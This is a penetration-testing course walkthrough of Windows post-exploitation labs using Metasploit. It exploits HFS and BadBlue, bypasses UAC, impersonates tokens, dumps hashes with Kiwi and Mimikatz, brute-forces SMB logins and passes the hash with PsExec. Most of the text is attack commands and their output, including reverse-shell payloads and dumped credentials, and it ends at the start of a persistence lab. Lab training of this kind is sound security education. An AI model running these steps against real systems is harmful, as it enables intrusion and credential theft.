# 🔬 Windows Post Exploitation - MSF

## Lab 1 - HTTP/HFS <a href="#lab-1-http-hfs" id="lab-1-http-hfs"></a>

> 🔬 Same [HFS Exploitation lab](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/hfs-msf-exp)
>
> * Target IP: `10.0.23.57`
> * Metasploit **`post/multi/manage/shell_to_meterpreter`** module

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.23.57
setg RHOST 10.0.23.57
workspace -a Windows_PostExp
```

* Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 10.0.23.57
```

```bash
[*] Nmap: Nmap scan report for 10.0.23.57
[*] Nmap: Host is up (0.0024s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

```bash
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
options
run
```

* In the new `Meterpreter` session, enumerate the Windows target

### Some commands <a href="#some-commands" id="some-commands"></a>

```bash
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    
meterpreter > getuid
    Server username: WIN-OMCNBKR66MN\Administrator
```

```bash
meterpreter > help
```

```bash
meterpreter > screenshot
    Screenshot saved to: /root/iOIoztJU.jpeg
```

<figure><img src="../../../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter > getsystem
    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

```bash
meterpreter > hashdump
    [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
```

```bash
meterpreter > show_mount 

    Mounts / Drives
    ===============
    
    Name  Type   Size (Total)  Size (Free)  Mapped to
    ----  ----   ------------  -----------  ---------
    C:\   fixed   29.66 GiB      8.48 GiB   
    
    
    Total mounts/drives: 1
```

```bash
meterpreter > ps
     2532  2492  explorer.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe

meterpreter > migrate 2532
    [*] Migrating from 1604 to 2532...
    [*] Migration completed successfully.

# meterpreter changed to x64 based on migrated process
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x64/windows
```

```bash
meterpreter > cd C:\\

meterpreter > ls
    Listing: C:\
    ============
    
    Mode              Size       Type  Last modified              Name
    ----              ----       ----  -------------              ----
    40777/rwxrwxrwx   0          dir   2020-08-12 09:43:47 +0530  $Recycle.Bin
    100666/rw-rw-rw-  1          fil   2013-08-22 21:16:48 +0530  BOOTNXT
    40777/rwxrwxrwx   0          dir   2013-08-22 20:18:41 +0530  Documents and Settings
    40777/rwxrwxrwx   0          dir   2013-08-22 21:09:30 +0530  PerfLogs
    40555/r-xr-xr-x   4096       dir   2013-08-22 19:06:16 +0530  Program Files
    40777/rwxrwxrwx   4096       dir   2013-08-22 19:06:16 +0530  Program Files (x86)
    40777/rwxrwxrwx   4096       dir   2013-08-22 19:06:16 +0530  ProgramData
    40777/rwxrwxrwx   0          dir   2020-09-05 09:16:25 +0530  System Volume Information
    40555/r-xr-xr-x   4096       dir   2013-08-22 19:06:16 +0530  Users
    40777/rwxrwxrwx   24576      dir   2013-08-22 19:06:16 +0530  Windows
    100444/r--r--r--  398356     fil   2013-08-22 21:16:48 +0530  bootmgr
    100666/rw-rw-rw-  32         fil   2020-09-14 12:21:58 +0530  flag.txt
    40777/rwxrwxrwx   0          dir   2020-09-14 11:40:20 +0530  hfs
    0000/---------    233263088  fif   1977-05-15 20:38:32 +0530  pagefile.sys

meterpreter > cat flag.txt 
    f74c8347798f4082daf4b4570dba094a

meterpreter > download flag.txt
    [*] Downloading: flag.txt -> flag.txt
    [*] Downloaded 32.00 B of 32.00 B (100.0%): flag.txt -> flag.txt
    [*] download   : flag.txt -> flag.txt
```

### Some Post Exploitation <a href="#some-post-exploitation" id="some-post-exploitation"></a>

```bash
msf5 > background
msf5 > sessions
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Architecture migrate

```bash
search migrate
use post/windows/manage/migrate
info
set SESSION 1
run

# It will not migrate if it's already a x64 process  
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Migration e.g. from x86 service

```bash
use post/windows/manage/archmigrate
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate current user privileges

```bash
search win_privs
use post/windows/gather/win_privs
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check current and recently logged on users

```bash
search enum_logged_on
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Determine if the system is a VM

```bash
search checkvm
use post/windows/gather/checkvm
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_Attacker could potentially utilize some VM breakout exploit modules to essentially break out of the virtual machine and consequently gain access to the host operating system that is hosting the virtual machine_
{% endhint %}

* Enumerate installed programs

```bash
search enum_applications
use post/windows/gather/enum_applications
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
📌 _Applications version is a very useful information. It can lead to a privilege escalation vulnerability!_
{% endhint %}

```
loot
```

* The `/root/.msf4/loot/` folder can be handy.

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check Antivirus

```bash
search type:post platform:windows enum_av
use post/windows/gather/enum_av_excluded
options
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate domain computers

```bash
search enum_computers
use post/windows/gather/enum_computers
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate installed patches

```bash
search enum_patches
use post/windows/gather/enum_patches
# Description:
#   This module will attempt to enumerate which patches are applied to a 
#   windows system based on the result of the WMI query: SELECT HotFixID 
#   FROM Win32_QuickFixEngineering

# A KB list can be specified

set SESSION 1
run

# If this doesn't work, migrate to a "NT AUTHORITY\SYSTEM" user service
```

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate any shares

```bash
search enum_shares
use post/windows/gather/enum_shares
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check if RDP is enabled

```bash
search rdp platform:windows
use post/windows/manage/enable_rdp
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Lab 2 - UAC Bypass <a href="#lab-2-uac-bypass" id="lab-2-uac-bypass"></a>

> 🔬 [UAC Bypass: Memory Injection (Metasploit)](https://attackdefense.com/challengedetailsnoauth?cid=2210)
>
> * Target IP: `10.0.22.148`
> * Metasploit [**`Windows Escalate UAC Protection Bypass (In Memory Injection)`**](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac\_injection/) module
>   * _This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process._

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.22.148
setg RHOST 10.0.22.148
workspace -a UACBypass
```

* Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 10.0.22.148
```

```bash
[*] Nmap: Nmap scan report for 10.0.22.148
[*] Nmap: Host is up (0.0024s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Exploitation / Meterpreter x64 <a href="#exploitation-meterpreter-x64" id="exploitation-meterpreter-x64"></a>

```bash
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
options
   Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.21.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

set payload windows/x64/meterpreter/reverse_tcp
run
```

```bash
meterpreter > sysinfo
    Computer        : VICTIM
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x64/windows
```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

```bash
meterpreter > getuid
    Server username: VICTIM\admin
    
meterpreter > getsystem
    [-] 2001: Operation failed: Access is denied. The following was attempted:
    [-] Named Pipe Impersonation (In Memory/Admin)
    [-] Named Pipe Impersonation (Dropper/Admin)
    [-] Token Duplication (In Memory/Admin)
    [-] Named Pipe Impersonation (RPCSS variant)
    
meterpreter > getprivs

    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeChangeNotifyPrivilege
    SeIncreaseWorkingSetPrivilege
    SeShutdownPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege
```

* On the Windows target `cmd`

```sh
shell
net users
net localgroup adminstrators
```

```bash
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users	
    net users
    
    User accounts for \\VICTIM
    
    -------------------------------------------------------------------------------
    admin                    Administrator            Guest                    
    The command completed successfully.


C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
    net localgroup administrators
    Alias name     administrators
    Comment        Administrators have complete and unrestricted access to the computer/domain
    
    Members
    
    -------------------------------------------------------------------------------
    admin
    Administrator
    The command completed successfully.
    
# Yes, "admin" is part of the Administrators group
# but doesn't have administrative privileges through the Meterpreter session

exit
```

### **Bypass UAC**

```bash
background
sessions
```

```bash
Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.21.5:4444 -> 10.0.22.148:49248 (10.0.22.148)
```

```bash
search bypassuac
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION 2
set LPORT 5533
run
```

<figure><img src="../../../../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Select the correct target - `x64`

<figure><img src="../../../../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Now the **`getsystem`** command should work

```bash
meterpreter > getsystem 
    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

### Hashes Dump <a href="#hashes-dump" id="hashes-dump"></a>

```bash
meterpreter > hashdump 
    admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

{% hint style="success" %}
Administrator NTLM Hash: `f168d9f8e6c5b893b8c4dfa202228235`
{% endhint %}

***

## Lab 3 - Token Impersonation <a href="#lab-3-token-impersonation" id="lab-3-token-impersonation"></a>

> 🔬 [Privilege Escalation: Impersonate](https://attackdefense.com/challengedetails?cid=2353)
>
> * Target IP: `10.0.18.30`
> * Check the [🔬Access Token lab here](../../system-host-based-attack/windows-operating-system/access-token.md) that already covered the Incognito tool
> * Metasploit **Token Impersonation with Incognito** inbuilt Meterpreter module
> * [Access Token Impersonation - Description](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks#access-token-impersonation)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.18.30
workspace -a Impersonate
db_nmap -sV 10.0.18.30
```

```bash
[*] Nmap: Nmap scan report for 10.0.18.30
[*] Nmap: Host is up (0.0022s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 80/tcp   open  http          HttpFileServer httpd 2.3
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 12.17 seconds
```

### Exploitation / Meterpreter x64 <a href="#exploitation-meterpreter-x64-1" id="exploitation-meterpreter-x64-1"></a>

```bash
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
options
set payload windows/x64/meterpreter/reverse_tcp
run
```

```bash
meterpreter > getuid
    Server username: NT AUTHORITY\LOCAL SERVICE
    
meterpreter > getprivs 

    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeAssignPrimaryTokenPrivilege
    SeAuditPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeImpersonatePrivilege # Token Impersonation can be performed
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeSystemtimePrivilege
    SeTimeZonePrivilege

meterpreter > hashdump # try to check if the user have sufficient privileges
    [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
    
meterpreter > getsystem 
    [-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
    [-] Named Pipe Impersonation (In Memory/Admin)
    [-] Named Pipe Impersonation (Dropper/Admin)
    [-] Token Duplication (In Memory/Admin)
    [-] Named Pipe Impersonation (RPCSS variant)
```

### Privilege Escalation <a href="#privilege-escalation-1" id="privilege-escalation-1"></a>

#### [**Incognito**](https://www.offsec.com/metasploit-unleashed/fun-incognito/)

```
meterpreter > load incognito 
    Loading extension incognito...Success.
```

<pre class="language-bash"><code class="lang-bash">meterpreter > list_tokens -u
<strong>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</strong>             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available
</code></pre>

* `ATTACKDEFENSE\Administrator` account access token would provide elevated privileges

```bash
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
             [-] Warning: Not currently running as SYSTEM, not all tokens will be available
                          Call rev2self if primary process token is SYSTEM
             [+] Delegation token available
             [+] Successfully impersonated user ATTACKDEFENSE\Administrator

meterpreter > getuid
             Server username: ATTACKDEFENSE\Administrator

meterpreter > hashdump
             [-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.
 # current process still has the access token associated with the anti authority account
 # so we have to migrate the process to elevate the privileges
```

```bash
meterpreter > ps
 Process List
 ============
 
  PID   PPID  Name                     Arch  Session  User                         Path
  ---   ----  ----                     ----  -------  ----                         ----
 3624  2016  explorer.exe             x64   1        ATTACKDEFENSE\Administrator  C:\Windows\explorer.exe

meterpreter > migrate 3624
  [*] Migrating from 3440 to 3624...
  [*] Migration completed successfully.

meterpreter > hashdump 
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

```bash
meterpreter > cd C:\\
meterpreter > cd Users 
meterpreter > cd Administrator # Administrator now can be access
    Listing: C:\Users\Administrator
    ===============================
    
    Mode              Size     Type  Last modified              Name
    ----              ----     ----  -------------              ----
    40555/r-xr-xr-x   0        dir   2020-11-07 12:52:42 +0530  3D Objects
    40777/rwxrwxrwx   0        dir   2020-11-07 06:14:51 +0530  AppData
    40777/rwxrwxrwx   0        dir   2020-11-07 06:14:52 +0530  Application Data
    40555/r-xr-xr-x   0        dir   2020-11-07 12:52:42 +0530  Contacts
    40777/rwxrwxrwx   0        dir   2020-11-07 06:14:52 +0530  Cookies
    40555/r-xr-xr-x   0        dir   2020-11-07 06:14:51 +0530  Desktop
```

```bash
meterpreter > cd \\Users\\Administrator\\Desktop\\
meterpreter > dir
    Listing: C:\Users\Administrator\Desktop
    =======================================
    
    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100666/rw-rw-rw-  282   fil   2020-11-07 12:52:42 +0530  desktop.ini
    100666/rw-rw-rw-  32    fil   2021-04-22 12:07:24 +0530  flag.txt

meterpreter > cat flag.txt 
    x28c832a39730b7d46d6c38f1ea18e12
```

{% hint style="success" %}
Flag: `x28c832a39730b7d46d6c38f1ea18e12`
{% endhint %}

***

## Lab 4 - Dump Hashes Mimikatz <a href="#lab-4-dump-hashes-mimikatz" id="lab-4-dump-hashes-mimikatz"></a>

> 🔬 [Windows: Meterpreter: Kiwi Extension](https://attackdefense.com/challengedetails?cid=2340)
>
> * Target IP: `10.0.18.161`
> * Check the [🔬Lab 2 - Mimikatz lab here](../../system-host-based-attack/windows-operating-system/windows-credentials-dumping.md) with full description of the commands

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.18.161
workspace -a Mimikatz
db_nmap -sV 10.0.18.161
```

```bash
[*] Nmap: Nmap scan report for 10.0.18.161
[*] Nmap: Host is up (0.0023s latency).
[*] Nmap: Not shown: 994 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 80/tcp   open  http          BadBlue httpd 2.7
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

```bash
search badblue 2.7
use exploit/windows/http/badblue_passthru
options
set TARGET BadBlue\ EE\ 2.7\ Universal
run
```

```bash
meterpreter > sysinfo
    Computer        : ATTACKDEFENSE
    OS              : Windows 2016+ (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows

meterpreter > getuid
    Server username: ATTACKDEFENSE\Administrator
```

### Hash Dumping - Kiwi <a href="#hash-dumping-kiwi" id="hash-dumping-kiwi"></a>

```bash
meterpreter > pgrep lsass
    604

meterpreter > migrate 604
    [*] Migrating from 4984 to 604...
    [*] Migration completed successfully.
# Meterpreter: x64/windows
```

```bash
meterpreter > load kiwi 
  Loading extension kiwi...
    .#####.   mimikatz 2.2.0 20191125 (x64/windows)
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
    '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
  
  Success.
  
meterpreter > help
    Kiwi Commands
    =============
    
        Command                Description
        -------                -----------
        creds_all              Retrieve all credentials (parsed)
        creds_kerberos         Retrieve Kerberos creds (parsed)
        creds_livessp          Retrieve Live SSP creds
        creds_msv              Retrieve LM/NTLM creds (parsed)
        creds_ssp              Retrieve SSP creds
        creds_tspkg            Retrieve TsPkg creds (parsed)
        creds_wdigest          Retrieve WDigest creds (parsed)
        dcsync                 Retrieve user account information via DCSync (unparsed)
        dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
        golden_ticket_create   Create a golden kerberos ticket
        kerberos_ticket_list   List all kerberos tickets (unparsed)
        kerberos_ticket_purge  Purge any in-use kerberos tickets
        kerberos_ticket_use    Use a kerberos ticket
        kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
        lsa_dump_sam           Dump LSA SAM (unparsed)
        lsa_dump_secrets       Dump LSA secrets (unparsed)
        password_change        Change the password/hash of a user
        wifi_list              List wifi profiles/creds for the current user
        wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

```bash
creds_all
lsa_dump_sam
lsa_dump_secrets
```

### Hash Dumping - Mimikatz.exe <a href="#hash-dumping-mimikatz.exe" id="hash-dumping-mimikatz.exe"></a>

```bash
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
```

* Run `mimikatz.exe`

```sh
mimikatz.exe
privilege::debug
	Privilege '20' OK
# I have the required privileges for hash extraction from memory
```

* Dump the cache of the `lsass` process

```sh
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords
```

***

## &#x20;Lab 5 - Pass-the-Hash with PsExec <a href="#lab-5-pass-the-hash-with-psexec" id="lab-5-pass-the-hash-with-psexec"></a>

> 🔬 [Windows: Meterpreter: Kiwi Extension](https://attackdefense.com/challengedetails?cid=2340) - same lab as Lab 4
>
> * Target IP: `10.0.20.226`
> * Check the [🔬Lab 3 - Pass-the-hash lab here](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/creds-dump#lab-3-pass-the-hash) for full description
> * Metasploit **PsExec** module

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.20.226
setg RHOST 10.0.20.226
workspace -a PsExec
db_nmap -sV 10.0.20.226
```

```bash
[*] Nmap: Not shown: 996 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
msf5 > db_nmap -p445 --script smb-protocols 10.0.20.226
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2024-07-31 14:45 IST
[*] Nmap: Nmap scan report for 10.0.20.226
[*] Nmap: Host is up (0.0022s latency).
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: Host script results:
[*] Nmap: | smb-protocols:
[*] Nmap: |   dialects:
[*] Nmap: |     2.02
[*] Nmap: |     2.10
[*] Nmap: |     3.00
[*] Nmap: |     3.02
[*] Nmap: |_    3.11
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```

### Exploitation <a href="#exploitation-1" id="exploitation-1"></a>

1. Exploit with smb

```bash
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
```

```bash
[+] 10.0.20.226:445       - 10.0.20.226:445 - Success: '.\sysadmin:samantha'
[+] 10.0.20.226:445       - 10.0.20.226:445 - Success: '.\demo:victoria'
[+] 10.0.20.226:445       - 10.0.20.226:445 - Success: '.\auditor:elizabeth'
[+] 10.0.20.226:445       - 10.0.20.226:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.0.20.226:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.242
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```

```bash
shell
cd /
dir
type flag.txt
```

2. Exploit with badblue

```bash
use exploit/windows/http/badblue_passthru
set TARGET BadBlue\ EE\ 2.7\ Universal
run
```

```bash
sysinfo
    Computer        : ATTACKDEFENSE
    OS              : Windows 2016+ (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows

getuid
	Server username: ATTACKDEFENSE\Administrator
```

### Privilege Escalation <a href="#privilege-escalation-2" id="privilege-escalation-2"></a>

```bash
pgrep lsass
migrate 780
getuid
	Server username: NT AUTHORITY\SYSTEM
```

### [Pass-the-hash - PSExec](https://www.offsec.com/metasploit-unleashed/psexec-pass-hash/) <a href="#pass-the-hash-psexec" id="pass-the-hash-psexec"></a>

```bash
hashdump
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

* **Use PSExec to login with `Administrator` user and its password hashes**

```bash
exit
search psexec
use exploit/windows/smb/psexec
options
set payload windows/x64/meterpreter/reverse_tcp
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
exploit
```

```bash
getuid
	Server username: NT AUTHORITY\SYSTEM

sysinfo
    Computer        : ATTACKDEFENSE
    OS              : Windows 2016+ (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x64/windows
```

***

## Lab 6 - Persistence <a href="#lab-6-persistence" id="lab-6-persistence"></a>

> 🔬 [Maintaining Access: Persistence Service](https://attackdefense.com/challengedetails?cid=2140)
>
> * Target IP: `10.0.23.90`
> * Metasploit **persistence** modules

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.23.90
workspace -a Persistence
db_nmap -sV 10.0.23.90
```

```bash
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
